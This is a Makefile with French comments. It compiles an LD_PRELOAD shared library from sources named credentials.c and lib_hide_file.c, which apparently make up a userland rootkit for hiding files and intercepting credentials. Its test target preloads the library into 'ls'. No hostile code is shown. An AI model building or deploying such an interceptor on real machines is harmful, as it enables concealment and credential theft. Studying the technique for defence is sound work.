# Variables de compilation
CC = gcc
CFLAGS = -shared -fPIC -Wall -Wextra -ldl -Iinclude
BUILD_DIR = build

# Nom de la bibliothèque partagée
INTERCEPT_SO = $(BUILD_DIR)/intercept.so

# Liste des fichiers sources
SRC_FILES = credentials.c lib_hide_file.c

# Liste des fichiers objets
OBJ_FILES = $(patsubst %.c, $(BUILD_DIR)/%.o, $(SRC_FILES))

# Cible principale
all: $(INTERCEPT_SO)

# Compilation de l'intercepteur en librairie partagée (LD_PRELOAD)
$(INTERCEPT_SO): $(OBJ_FILES)
	mkdir -p $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^

# Compilation des fichiers sources en objets
$(BUILD_DIR)/%.o: %.c
	mkdir -p $(BUILD_DIR)
	$(CC) $(CFLAGS) -c $< -o $@

# Nettoyage
clean:
	rm -rf $(BUILD_DIR)

# Test de LD_PRELOAD
test:
	LD_PRELOAD=$(INTERCEPT_SO) ls

.PHONY: all clean test
